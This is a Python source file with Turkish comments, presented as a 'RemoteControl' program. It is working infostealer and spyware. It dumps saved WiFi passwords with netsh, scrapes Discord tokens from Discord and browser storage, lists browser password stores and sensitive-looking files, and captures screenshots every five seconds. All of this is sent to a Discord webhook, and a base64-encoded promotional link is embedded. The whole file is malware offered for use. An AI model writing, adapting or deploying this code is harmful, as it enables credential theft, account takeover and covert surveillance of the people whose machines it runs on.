import pyautogui
import requests
import time
import os
import cv2
import json
import subprocess
import re
import base64
from io import BytesIO
from datetime import datetime
import platform
import psutil
import socket
import getpass
import glob

import base64
# Burayıda değiştirme be gülüm. 
_yt_encoded = "aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGJyeGZlYXI="
YT_LINK = base64.b64decode(_yt_encoded).decode("utf-8")

# webhook URL gelcek
WEBHOOK_URL = "BURAYA YAPIŞTIR"
CONFIG = {
    "screenshot_interval": 5,
    "max_file_size": 8 * 1024 * 1024,
    "first_run": True
}

class RemoteControl:
    def __init__(self):
        self.running = True
        self.screenshot_count = 0
        
    def send_to_webhook(self, content=None, file=None, filename=None):
        """Webhook'a mesaj veya dosya gönder"""
        try:
            if file:
                files = {'file': (filename, file, self._get_mime_type(filename))}
                data = {'content': content} if content else {}
                response = requests.post(WEBHOOK_URL, data=data, files=files)
            else:
                # Content'i 2000 karaktere böl (Discord limiti)
                if content and len(content) > 2000:
                    chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
                    for chunk in chunks:
                        response = requests.post(WEBHOOK_URL, json={'content': chunk})
                        time.sleep(0.5)
                    return True
                else:
                    response = requests.post(WEBHOOK_URL, json={'content': content})
            
            if response.status_code in [200, 204]:
                print(f"[✓] Gönderildi")
                return True
            else:
                print(f"[✗] Hata: {response.status_code}")
                return False
        except Exception as e:
            print(f"[✗] Webhook hatası: {e}")
            return False
    
    def _get_mime_type(self, filename):
        if filename.endswith('.png'):
            return 'image/png'
        elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
            return 'image/jpeg'
        elif filename.endswith('.mp4'):
            return 'video/mp4'
        elif filename.endswith('.txt'):
            return 'text/plain'
        else:
            return 'application/octet-stream'
    
    # ============ SİSTEM BİLGİSİ ============
    
    def get_system_info(self):
        try:
            info = f"""
# 🖥️ SİSTEM BİLGİLERİ
{YT_LINK}

## 💻 Bilgisayar Bilgileri
- **Bilgisayar Adı:** `{platform.node()}`
- **Kullanıcı Adı:** `{getpass.getuser()}`
- **Sistem:** `{platform.system()} {platform.release()}`
- **Makine:** `{platform.machine()}`

## 📊 Donanım
- **CPU:** `{psutil.cpu_percent()}%` ({psutil.cpu_count()} çekirdek)
- **RAM:** `{psutil.virtual_memory().used / (1024**3):.1f}GB` / `{psutil.virtual_memory().total / (1024**3):.1f}GB` ({psutil.virtual_memory().percent}%)
- **Disk:** `{psutil.disk_usage('/').used / (1024**3):.1f}GB` / `{psutil.disk_usage('/').total / (1024**3):.1f}GB` ({psutil.disk_usage('/').percent}%)

## 🌐 Ağ Bilgileri
- **IP:** `{self.get_ip()}`
- **Hostname:** `{socket.gethostname()}`

## ⏱️ Sistem
- **Çalışma Süresi:** `{int(time.time() - psutil.boot_time()) // 3600} saat`
- **Zaman:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
"""
            return info
        except Exception as e:
            return f"❌ Sistem bilgisi hatası: {e}"
    
    def get_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "Bilinmiyor"
    
    # ============ DISCORD TOKEN BULMA (GELİŞMİŞ) ============
    
    def find_discord_tokens(self):
        """Discord token'lerini bul - GELİŞMİŞ"""
        tokens = set()
        
        # Discord'un depolama yolları
        discord_paths = [
            # Discord
            os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
            os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
            # Chrome/Chromium tabanlı
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Profile *\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Profile *\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile *\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Opera Software\Opera Stable\Local Storage\leveldb'),
            os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Local Storage\leveldb'),
            # Firefox
            os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*\webappsstore.sqlite'),
            os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*\cookies.sqlite'),
            # Sistem
            os.path.expandvars(r'%USERPROFILE%\AppData\Roaming\discord\Local Storage\leveldb'),
            os.path.expandvars(r'%USERPROFILE%\AppData\Local\discord\Local Storage\leveldb'),
        ]
        
        # Token regex - Discord token formatları
        token_patterns = [
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Normal token
            r'mfa\.[\w-]{84}',                   # MFA token
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',  # Bot token
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}[\w-]{0,10}', # Token with extra
        ]
        
        # 1. Discord ve tarayıcı depolama dosyalarını tara
        for path_pattern in discord_paths:
            for path in glob.glob(path_pattern):
                if os.path.exists(path):
                    try:
                        if os.path.isfile(path):
                            self._scan_file_for_tokens(path, tokens, token_patterns)
                        elif os.path.isdir(path):
                            for file in os.listdir(path):
                                if file.endswith(('.log', '.ldb', '.sqlite')):
                                    file_path = os.path.join(path, file)
                                    self._scan_file_for_tokens(file_path, tokens, token_patterns)
                    except:
                        pass
        
        # 2. Windows Registry'de ara
        try:
            import winreg
            key_paths = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
            ]
            for key_path in key_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            for pattern in token_patterns:
                                found = re.findall(pattern, str(value))
                                for token in found:
                                    if token and len(token) > 50:
                                        tokens.add(token)
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
        
        # 3. Environment variables'da ara
        for key, value in os.environ.items():
            for pattern in token_patterns:
                found = re.findall(pattern, value)
                for token in found:
                    if token and len(token) > 50:
                        tokens.add(token)
        
        # 4. Discord çalışma belleğinden token alma (eğer çalışıyorsa)
        try:
            import ctypes
            import psutil
            
            # Discord process'lerini bul
            for proc in psutil.process_iter(['name', 'pid']):
                if 'discord' in proc.info['name'].lower():
                    try:
                        # Token'ları memory'de ara (basit yöntem)
                        for pattern in token_patterns:
                            # Not: Gerçek memory okuma için ayrı bir yaklaşım gerekli
                            pass
                    except:
                        pass
        except:
            pass
        
        return list(tokens)
    
    def _scan_file_for_tokens(self, file_path, tokens, patterns):
        """Dosyadan token ara - Encoding hatasız"""
        try:
            # Farklı encoding'ler dene
            encodings = ['utf-8', 'utf-16', 'latin-1', 'cp1254', 'cp1252', 'ascii', 'iso-8859-1']
            
            for encoding in encodings:
                try:
                    with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                        content = f.read()
                        for pattern in patterns:
                            found = re.findall(pattern, content)
                            for token in found:
                                # Token geçerlilik kontrolü
                                if token and len(token) > 50 and '.' in token:
                                    tokens.add(token)
                    break  # Başarılı okunduysa çık
                except:
                    continue
                    
            # Binary olarak dene (son çare)
            try:
                with open(file_path, 'rb') as f:
                    content = f.read().decode('latin-1', errors='ignore')
                    for pattern in patterns:
                        found = re.findall(pattern, content)
                        for token in found:
                            if token and len(token) > 50 and '.' in token:
                                tokens.add(token)
            except:
                pass
                
        except Exception as e:
            # Sessizce geç
            pass
    
    # ============ WIFI ŞİFRELERİ ============
    
    def get_wifi_passwords(self):
        try:
            profiles = []
            # Encoding hatasız çalıştır
            result = subprocess.run(
                'netsh wlan show profiles', 
                shell=True, 
                capture_output=True, 
                text=True,
                encoding='cp857',  # Türkçe için
                errors='ignore'
            )
            
            for line in result.stdout.split('\n'):
                if ':' in line and ('Tüm Kullanıcı Profili' in line or 'All User Profile' in line):
                    profile = line.split(':')[-1].strip()
                    profiles.append(profile)
            
            wifi_info = "## 📶 WiFi Şifreleri\n"
            for profile in profiles:
                result = subprocess.run(
                    f'netsh wlan show profile "{profile}" key=clear',
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='cp857',
                    errors='ignore'
                )
                password = None
                for line in result.stdout.split('\n'):
                    if 'Anahtar İçeriği' in line or 'Key Content' in line:
                        password = line.split(':')[-1].strip()
                        break
                
                if password:
                    wifi_info += f"- **{profile}:** `{password}`\n"
                else:
                    wifi_info += f"- **{profile}:** Şifre yok veya bulunamadı\n"
            
            return wifi_info
        except Exception as e:
            return f"❌ WiFi bilgisi alınamadı: {e}"
    
    # ============ AĞ BİLGİLERİ ============
    
    def get_network_info(self):
        try:
            info = ""

            info += f"\n{YT_LINK}\n"
            
            # IP Config - Encoding hatasız
            result = subprocess.run(
                'ipconfig',
                shell=True,
                capture_output=True,
                text=True,
                encoding='cp857',
                errors='ignore'
            )
            info += "## 🌐 IP Config\n```\n" + result.stdout[:1000] + "\n```\n"
            
            # ARP Tablosu
            result = subprocess.run(
                'arp -a',
                shell=True,
                capture_output=True,
                text=True,
                encoding='cp857',
                errors='ignore'
            )
            info += "## 📡 ARP Tablosu\n```\n" + result.stdout[:500] + "\n```\n"
            
            # Network Connections
            result = subprocess.run(
                'netstat -an',
                shell=True,
                capture_output=True,
                text=True,
                encoding='cp857',
                errors='ignore'
            )
            info += "## 🔌 Ağ Bağlantıları\n```\n" + result.stdout[:500] + "\n```\n"
            
            return info
        except Exception as e:
            return f"❌ Ağ bilgisi alınamadı: {e}"
    
    # ============ KAYDEDİLMİŞ ŞİFRELER ============
    
    def find_saved_passwords(self):
        try:
            passwords = []
            
            # Chrome
            chrome_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
            if os.path.exists(chrome_path):
                passwords.append("✅ Chrome şifreleri bulundu")
            
            # Edge
            edge_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
            if os.path.exists(edge_path):
                passwords.append("✅ Edge şifreleri bulundu")
            
            # Firefox
            firefox_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
            if os.path.exists(firefox_path):
                passwords.append("✅ Firefox şifreleri bulundu")
            
            # Brave
            brave_path = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data')
            if os.path.exists(brave_path):
                passwords.append("✅ Brave şifreleri bulundu")
            
            # Opera
            opera_path = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Login Data')
            if os.path.exists(opera_path):
                passwords.append("✅ Opera şifreleri bulundu")
            
            if not passwords:
                passwords.append("❌ Kaydedilmiş şifre bulunamadı")
            
            return "\n".join(passwords)
        except:
            return "❌ Şifre bilgisi alınamadı"
    
    # ============ ÖNEMLİ DOSYALAR ============
    
    def find_important_files(self):
        try:
            files = []
            
            search_paths = [
                os.path.expanduser("~\\Desktop"),
                os.path.expanduser("~\\Documents"),
                os.path.expanduser("~\\Downloads"),
            ]
            
            extensions = ['.txt', '.docx', '.doc', '.xlsx', '.xls', '.pdf', '.zip', '.rar', '.7z', '.bak', '.backup', '.sql', '.db', '.key', '.pem', '.crt', '.p12']
            keywords = ['password', 'şifre', 'token', 'key', 'secret', 'bank', 'kredi', 'hesap', 'login']
            
            for path in search_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files_list in os.walk(path):
                            for file in files_list[:10]:
                                file_path = os.path.join(root, file)
                                
                                ext = os.path.splitext(file)[1].lower()
                                if ext in extensions:
                                    files.append(file_path)
                                    continue
                                
                                for keyword in keywords:
                                    if keyword.lower() in file.lower():
                                        files.append(file_path)
                                        break
                    except:
                        pass
            
            return files[:20]
        except:
            return []
    
    # ============ EKRAN GÖRÜNTÜSÜ ============
    
    def capture_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            
            screenshot = pyautogui.screenshot()
            buffered = BytesIO()
            screenshot.save(buffered, format="PNG")
            buffered.seek(0)
            

            self.send_to_webhook(
                content=f"📸 Ekran Görüntüsü - {timestamp}",
                file=buffered,
                filename=filename
            )
            
            self.screenshot_count += 1
            print(f"[✓] Screenshot {self.screenshot_count}")
            return True
            
        except Exception as e:
            print(f"[✗] Screenshot hatası: {e}")
            return False

    # ============ İLK ÇALIŞTIRMA ============
    
    def first_run(self):
        print("[*] İlk çalıştırma - Bilgiler toplanıyor...")
        
        
        # 1. Sistem Bilgisi
        print("[*] Sistem bilgisi alınıyor...")
        self.send_to_webhook(self.get_system_info())
        time.sleep(1)
        
        # 2. Ağ Bilgileri
        print("[*] Ağ bilgileri alınıyor...")
        self.send_to_webhook(self.get_network_info())
        time.sleep(1)
        
        # 3. WiFi Şifreleri
        print("[*] WiFi şifreleri alınıyor...")
        self.send_to_webhook(self.get_wifi_passwords())
        time.sleep(1)
        
        # 4. Discord Token'leri (GELİŞMİŞ)
        print("[*] Discord token'leri aranıyor...")
        tokens = self.find_discord_tokens()
        if tokens:
            token_text = "## 🔑 Discord Token'leri\n"
            for i, token in enumerate(tokens[:10]):
                token_text += f"- `{token}`\n"
            self.send_to_webhook(token_text)
        else:
            # Hiç token bulunamadıysa bilgi ver
            self.send_to_webhook("## 🔑 Discord Token'leri\n```\n⚠️ Discord token bulunamadı. Discord kapalı olabilir veya token'ler şifrelenmiş olabilir.\n```")
        time.sleep(1)
        
        # 5. Kaydedilmiş Şifreler
        print("[*] Kaydedilmiş şifreler aranıyor...")
        passwords = self.find_saved_passwords()
        self.send_to_webhook(f"## 🔒 Kaydedilmiş Şifreler\n```\n{passwords}\n```")
        time.sleep(1)
        
        # 6. Önemli Dosyalar
        print("[*] Önemli dosyalar aranıyor...")
        files = self.find_important_files()
        if files:
            files_text = "## 📁 Önemli Dosyalar\n"
            for f in files[:10]:
                files_text += f"- `{f}`\n"
            self.send_to_webhook(files_text)
        else:
            self.send_to_webhook("## 📁 Önemli Dosyalar\n```\nÖnemli dosya bulunamadı\n```")
        time.sleep(1)
        
        # 7. Tarayıcı Bilgileri
        print("[*] Tarayıcı bilgileri alınıyor...")
        browsers = self.get_browser_data()
        self.send_to_webhook(browsers)
        time.sleep(1)
        
        # 8. İlk Ekran Görüntüsü
        print("[*] İlk ekran görüntüsü alınıyor...")
        self.capture_screenshot()
        
        print("[✓] İlk çalıştırma tamamlandı!")
        CONFIG["first_run"] = False
    
    def get_browser_data(self):
        try:
            browsers = []
            
            # Chrome
            chrome = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default')
            if os.path.exists(chrome):
                browsers.append("✅ Chrome")
            
            # Edge
            edge = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default')
            if os.path.exists(edge):
                browsers.append("✅ Edge")
            
            # Firefox
            firefox = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
            if os.path.exists(firefox):
                browsers.append("✅ Firefox")
            
            # Opera
            opera = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable')
            if os.path.exists(opera):
                browsers.append("✅ Opera")
            
            # Brave
            brave = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default')
            if os.path.exists(brave):
                browsers.append("✅ Brave")
            
            if not browsers:
                browsers.append("❌ Tarayıcı bulunamadı")
            
            return "## 🌐 Tarayıcılar\n" + "\n".join([f"- {b}" for b in browsers])
        except:
            return "❌ Tarayıcı bilgisi alınamadı"
    
    # ============ ANA DÖNGÜ ============
    
    def run(self):
        print("[*] Remote Control başlatıldı...")
        
        if CONFIG["first_run"]:
            self.first_run()
        else:
            self.capture_screenshot()
        
        print(f"[*] Her {CONFIG['screenshot_interval']} saniyede ekran görüntüsü alınıyor...")
        print("[*] Durdurmak için Ctrl+C")
        
        try:
            while self.running:
                time.sleep(CONFIG["screenshot_interval"])
                self.capture_screenshot()
                
        except KeyboardInterrupt:
            print("\n[*] Program durduruldu.")
            self.send_to_webhook("🛑 Program durduruldu")
            self.send_to_webhook(f"\n{YT_LINK}\n")
        except Exception as e:
            print(f"[✗] Hata: {e}")

if __name__ == "__main__":
    rc = RemoteControl()
    rc.run()